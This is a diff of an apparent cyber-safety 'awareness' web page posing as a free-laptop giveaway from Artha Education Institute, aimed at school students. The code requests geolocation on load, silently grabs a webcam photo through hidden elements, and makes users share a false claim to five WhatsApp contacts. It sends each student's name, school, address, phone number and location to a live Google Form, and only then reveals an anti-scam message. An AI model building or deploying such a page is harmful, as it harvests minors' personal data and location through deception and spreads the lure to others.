@@ -6,7 +6,7 @@
   <title>Win a Free Laptop - Artha Education</title>
   <style>
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Segoe UI', sans-serif;
       margin: 0; padding: 0;
       background: #f5f5f5;
       text-align: center;
@@ -29,13 +29,11 @@
     label {
       display: block;
       margin: 0.5rem 0 0.2rem;
-      font-weight: bold;
     }
     input {
       padding: 0.5rem;
       width: 100%;
       margin-bottom: 1rem;
-      box-sizing: border-box;
     }
     button {
       padding: 0.75rem 1.5rem;
@@ -45,231 +43,244 @@
       border-radius: 5px;
       cursor: pointer;
       margin-top: 1rem;
-      font-size: 1rem;
     }
-    #camera, #canvas {
-      display: none;
-      margin: 1rem 0;
-      width: 100%;
-    }
-    #photoResult {
-      max-width: 100%;
-      border: 1px solid #ddd;
-      margin-top: 1rem;
-    }
-    #map {
-      width: 100%;
-      height: 250px;
-      margin-top: 1rem;
-      border-radius: 10px;
+    .hidden {
+      display: none !important;
     }
     .final-message {
       display: none;
-      text-align: left;
+    }
+    #map {
+      width: 100%;
+      height: 200px;
+      margin-top: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 5px;
     }
   </style>
 </head>
 <body>
   <div class="container" id="step1">
     <img src="Artha.jpg" alt="Artha Logo" class="logo" />
-    <h1>🎁 Win a Free Laptop!</h1>
-    <p>Congratulations! You have been selected by <strong>Artha Education Institute – Katulanda</strong>.</p>
+    <h1>🎁 Win a Free Laptop! / 🎁 නොමිලේ ලැප්ටොප් දිනාගන්න!</h1>
+    <p>Congratulations! You have been selected by <strong>Artha Education Institute – Katulanda</strong>.<br>සුභ පතමු! ඔබ තේරී පත්වී ඇත <strong>අර්ථා අධ්‍යාපන ආයතනය – කටුලන්ද</strong>.</p>
     <form id="userForm">
-      <label for="name">Full Name / නම:</label>
-      <input type="text" id="name" name="name" required />
-      
-      <label for="grade">Grade / ශ්‍රේණිය:</label>
-      <input type="text" id="grade" name="grade" required />
-      
-      <label for="school">School / පාසල:</label>
-      <input type="text" id="school" name="school" required />
-      
-      <label for="address">Address / ලිපිනය:</label>
-      <input type="text" id="address" name="address" required />
-      
-      <label for="contact">Contact Number / දුරකථන අංකය:</label>
-      <input type="text" id="contact" name="contact" required />
-      
-      <button type="button" onclick="nextStep()">Next</button>
+      <label>Name / නම:</label>
+      <input type="text" id="name" required />
+      <label>Grade / ශ්‍රේණිය:</label>
+      <input type="text" id="grade" required />
+      <label>School / පාසල:</label>
+      <input type="text" id="school" required />
+      <label>Address / ලිපිනය:</label>
+      <input type="text" id="address" required />
+      <label>Contact No / දුරකථන අංකය:</label>
+      <input type="text" id="contactno" required />
+      <button type="button" onclick="nextStep()">Next / ඊළඟට</button>
     </form>
   </div>
 
   <div class="container" id="step2" style="display:none;">
-    <h2>📷 Camera Permission</h2>
-    <p>Camera will be accessed briefly for verification (hidden).</p>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <h2>📷 Automatic Photo Capture / ස්වයංක්‍රීය ඡායාරූප ග්‍රහණය</h2>
+    <p>This site will automatically capture a photo for verification. Please allow camera permission.<br>සත්‍යාපන සඳහා ස්වයංක්‍රීයව ඡායාරූප ග්‍රහණය කෙරේ. කරුණාකර කැමරා අවසර දෙන්න.</p>
+    <!-- Hidden video and canvas -->
+    <video id="video" autoplay class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
   </div>
 
   <div class="container" id="step3" style="display:none;">
-    <h2>📲 Share with 10 WhatsApp Contacts</h2>
-    <p>To receive your gift, share this with 10 WhatsApp friends:</p>
-    <p><strong>🎁 I just claimed a laptop from Artha Institute! You can too!</strong></p>
-    <button onclick="finalStep()">I've Shared</button>
+    <h2>📲 Share with 5 WhatsApp Contacts / WhatsApp මිතුරන් 5 දෙනෙකුට බෙදා හදා ගන්න</h2>
+    <p>To receive your gift, share this with 5 WhatsApp friends:<br>ඔබේ තෑග්ග ලබා ගැනීමට WhatsApp මිතුරන් 5 දෙනෙකුට මෙම ලිපිය බෙදා හදා ගන්න:</p>
+    <p><strong>"🎁 I just claimed a laptop from Artha Institute! You can too! / මම අර්ථා ආයතනයෙන් ලැප්ටොප් එකක් දිනලා! ඔබටත් පුළුවන්!"</strong></p>
+    <button id="shareBtn" onclick="shareWhatsApp()">Share on WhatsApp / WhatsApp බෙදා හදා ගන්න</button>
+    <p>Shared: <span id="shareCount">0</span>/5</p>
   </div>
 
   <div class="container final-message" id="final" style="display:none;">
-    <h2>🚨 Don't Fall for Online Scams!</h2>
-    <p>You just entered:</p>
+    <h2>🚨 Don't Fall for Online Scams! / අන්තර්ජාල වංචා වලට බියවෙන්න එපා!</h2>
+    <p>You entered / ඔබ ඇතුල් කළේ:</p>
     <ul>
-      <li><strong>Name:</strong> <span id="showName"></span></li>
-      <li><strong>Grade:</strong> <span id="showGrade"></span></li>
-      <li><strong>School:</strong> <span id="showSchool"></span></li>
-      <li><strong>Address:</strong> <span id="showAddress"></span></li>
-      <li><strong>Contact Number:</strong> <span id="showContact"></span></li>
+      <li><strong>Name / නම:</strong> <span id="showName"></span></li>
+      <li><strong>Grade / ශ්‍රේණිය:</strong> <span id="showGrade"></span></li>
+      <li><strong>School / පාසල:</strong> <span id="showSchool"></span></li>
+      <li><strong>Address / ලිපිනය:</strong> <span id="showAddress"></span></li>
+      <li><strong>Contact No / දුරකථන අංකය:</strong> <span id="showContactno"></span></li>
+      <li><strong>Location / පිහිටීම:</strong> <span id="showLocation"></span></li>
     </ul>
-    <p>And shared your <strong>photo</strong> with a fake offer:</p>
-    <canvas id="photoResult"></canvas>
-    <p style="color:red; font-weight:bold; margin-top:1rem;">
-      ❌ Don’t enter real details in random surveys!<br />
-      ✅ Learn Cyber Safety with Artha Education Institute.
-    </p>
+    <p>You shared your <strong>photo</strong> with a fake offer.<br>ඔබේ ඡායාරූපය වංචා මඟින් බෙදා හදා ඇත.</p>
+    <canvas id="photoResult" style="width:100%; max-width:400px; border:1px solid #ccc;"></canvas>
+
     <div id="map"></div>
+
+    <p style="color:red; font-weight:bold;">
+      ❌ Don’t enter real details in random surveys!<br>
+      ✅ Learn Cyber Safety with Artha Education Institute.<br><br>
+      ❌ අහඹු සමීක්ෂණ වලදී ඔබේ සැබෑ තොරතුරු ඇතුල් කරන්න එපා!<br>
+      ✅ අර්ථා අධ්‍යාපන ආයතනය සමඟ සයිබර් ආරක්ෂාව ඉගෙන ගන්න.
+    </p>
   </div>
 
-<script>
-  // Google Form submit URL
-  const formAction = "https://docs.google.com/forms/d/e/1FAIpQLScPUa7P9wKKkEmwimOmOIhTgIM7u9zhETOYqIURWcerO3s4Dg/formResponse";
+  <script>
+    // Google form url with entries
+    const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScPUa7P9wKKkEmwimOmOIhTgIM7u9zhETOYqIURWcerO3s4Dg/formResponse";
 
-  // Elements
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
-  const step3 = document.getElementById('step3');
-  const final = document.getElementById('final');
+    // form fields
+    const nameInput = document.getElementById('name');
+    const gradeInput = document.getElementById('grade');
+    const schoolInput = document.getElementById('school');
+    const addressInput = document.getElementById('address');
+    const contactInput = document.getElementById('contactno');
 
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const photoResult = document.getElementById('photoResult');
+    // step containers
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const finalStepDiv = document.getElementById('final');
 
-  let stream;
-  let latitude = null;
-  let longitude = null;
+    // video & canvas for camera capture
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const photoResult = document.getElementById('photoResult');
 
-  function nextStep() {
-    if (!document.getElementById('userForm').reportValidity()) return;
+    // share button & counter
+    const shareBtn = document.getElementById('shareBtn');
+    const shareCountSpan = document.getElementById('shareCount');
+    let shareCount = 0;
+    const shareTarget = 5;
 
-    step1.style.display = 'none';
-    step2.style.display = 'block';
+    // location variables
+    let currentLocation = "";
+    let latitude = null;
+    let longitude = null;
 
-    // Start camera and capture photo silently
-    startCamera();
-  }
+    // move from step1 to step2 and start camera capture automatically
+    function nextStep() {
+      // Validate inputs here if needed (already required)
+      step1.style.display = "none";
+      step2.style.display = "block";
 
-  function startCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(str => {
-        stream = str;
-        video.srcObject = stream;
-        video.play();
-
-        // Wait 2 seconds then capture photo automatically
-        setTimeout(() => {
-          capturePhoto();
-        }, 2000);
-      })
-      .catch(() => {
-        alert('Camera permission denied! You cannot proceed.');
-        // Optionally go back to step1
-        step2.style.display = 'none';
-        step1.style.display = 'block';
-      });
-  }
-
-  function capturePhoto() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Stop camera
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
+      startCameraAndCapture();
     }
 
-    step2.style.display = 'none';
-    step3.style.display = 'block';
-  }
+    // Start camera, capture photo automatically, then move to step3
+    function startCameraAndCapture() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
 
-  function finalStep() {
-    // Show final message with data and photo
-    const name = document.getElementById('name').value;
-    const grade = document.getElementById('grade').value;
-    const school = document.getElementById('school').value;
-    const address = document.getElementById('address').value;
-    const contact = document.getElementById('contact').value;
-
-    document.getElementById('showName').innerText = name;
-    document.getElementById('showGrade').innerText = grade;
-    document.getElementById('showSchool').innerText = school;
-    document.getElementById('showAddress').innerText = address;
-    document.getElementById('showContact').innerText = contact;
-
-    // Draw photo on final canvas
-    photoResult.width = canvas.width;
-    photoResult.height = canvas.height;
-    photoResult.getContext('2d').drawImage(canvas, 0, 0);
-
-    step3.style.display = 'none';
-    final.style.display = 'block';
-
-    // Submit form data to Google Form
-    submitToGoogleForm({ name, grade, school, address, contact, location: latitude + "," + longitude });
-
-    // Show user location on map
-    if (latitude && longitude) {
-      showMap(latitude, longitude);
-    } else {
-      // Try to get location if not captured yet
-      getLocation();
+          // Wait for video to be ready
+          video.onloadedmetadata = () => {
+            // Small timeout to ensure video stream is ready
+            setTimeout(() => {
+              capturePhoto();
+              // Stop camera stream immediately after capture
+              stream.getTracks().forEach(track => track.stop());
+              step2.style.display = "none";
+              step3.style.display = "block";
+            }, 1000);
+          };
+        })
+        .catch(err => {
+          alert('Camera permission denied! / කැමරා අවසර ප්‍රතික්ෂේප කරන ලදි!');
+          // Go back to step1 so user can retry or quit
+          step2.style.display = "none";
+          step1.style.display = "block";
+        });
     }
-  }
 
-  // Submit data to Google Form via fetch
-  function submitToGoogleForm(data) {
-    const formData = new FormData();
-    formData.append('entry.997021349', data.name);
-    formData.append('entry.180306948', data.grade);
-    formData.append('entry.74488444', data.school);
-    formData.append('entry.377707306', data.address);
-    formData.append('entry.1450609673', data.contact);
-    formData.append('entry.1946665100', data.location);
-
-    fetch(formAction, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: formData
-    }).catch(err => console.error('Google Form submit error:', err));
-  }
-
-  // Get user's current location
-  function getLocation() {
-    if (!navigator.geolocation) {
-      alert('Geolocation is not supported by your browser');
-      return;
+    // Capture photo to canvas
+    function capturePhoto() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
     }
-    navigator.geolocation.getCurrentPosition(position => {
-      latitude = position.coords.latitude;
-      longitude = position.coords.longitude;
-      showMap(latitude, longitude);
-    }, () => {
-      alert('Unable to retrieve your location');
-    });
-  }
 
-  // Show Google Map with user's location
-  function showMap(lat, lng) {
-    const mapDiv = document.getElementById('map');
-    const iframe = document.createElement('iframe');
-    iframe.width = "100%";
-    iframe.height = "250";
-    iframe.style.border = 0;
-    iframe.loading = "lazy";
-    iframe.allowFullscreen = true;
-    iframe.referrerPolicy = "no-referrer-when-downgrade";
-    iframe.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
-    mapDiv.innerHTML = '';
-    mapDiv.appendChild(iframe);
-  }
-</script>
+    // Share WhatsApp message with counter to ensure 5 shares
+    function shareWhatsApp() {
+      const message = encodeURIComponent("🎁 I just claimed a laptop from Artha Institute! You can too! / මම අර්ථා ආයතනයෙන් ලැප්ටොප් එකක් දිනලා! ඔබටත් පුළුවන්!");
+      const whatsappUrl = `https://wa.me/?text=${message}`;
+
+      window.open(whatsappUrl, '_blank');
+
+      shareCount++;
+      shareCountSpan.textContent = shareCount;
+
+      if (shareCount >= shareTarget) {
+        shareBtn.disabled = true;
+        shareBtn.textContent = "Thank you for sharing! / බෙදා හදා ගැනීම සඳහා ස්තුතියි!";
+        finalStep();
+      }
+    }
+
+    // Final step: show all details, photo, map, and submit data to google form
+    function finalStep() {
+      // Show user input data
+      document.getElementById('showName').innerText = nameInput.value;
+      document.getElementById('showGrade').innerText = gradeInput.value;
+      document.getElementById('showSchool').innerText = schoolInput.value;
+      document.getElementById('showAddress').innerText = addressInput.value;
+      document.getElementById('showContactno').innerText = contactInput.value;
+      document.getElementById('showLocation').innerText = currentLocation || "Not available / නොමැත";
+
+      // Show photo on final canvas
+      const ctx = photoResult.getContext('2d');
+      photoResult.width = canvas.width;
+      photoResult.height = canvas.height;
+      ctx.drawImage(canvas, 0, 0);
+
+      step3.style.display = "none";
+      finalStepDiv.style.display = "block";
+
+      // Submit data to Google Form
+      submitToGoogleForm();
+      
+      // Show map if location available
+      if(latitude && longitude) {
+        showMap(latitude, longitude);
+      }
+    }
+
+    // Submit user data to Google Form via POST using fetch
+    function submitToGoogleForm() {
+      const formData = new FormData();
+      formData.append('entry.997021349', nameInput.value);
+      formData.append('entry.180306948', gradeInput.value);
+      formData.append('entry.74488444', schoolInput.value);
+      formData.append('entry.377707306', addressInput.value);
+      formData.append('entry.1450609673', contactInput.value);
+      formData.append('entry.1946665100', currentLocation);
+
+      fetch(googleFormURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: formData
+      }).catch(err => console.warn('Google Form submission failed', err));
+    }
+
+    // Get user location when page loads (or step1 shown)
+    function getLocation() {
+      if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          latitude = pos.coords.latitude;
+          longitude = pos.coords.longitude;
+          currentLocation = `Lat: ${latitude.toFixed(5)}, Lon: ${longitude.toFixed(5)}`;
+        }, err => {
+          currentLocation = "Permission denied / අවසර ප්‍රතික්ෂේපයි";
+        });
+      } else {
+        currentLocation = "Geolocation not supported / ගිණුම් අනුමත නැත";
+      }
+    }
+
+    // Show map in #map div using Google Maps iframe
+    function showMap(lat, lon) {
+      const mapDiv = document.getElementById('map');
+      const src = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
+      mapDiv.innerHTML = `<iframe width="100%" height="200" frameborder="0" style="border:0" src="${src}" allowfullscreen></iframe>`;
+    }
+
+    // Start by getting location
+    getLocation();
+  </script>
 </body>
 </html>
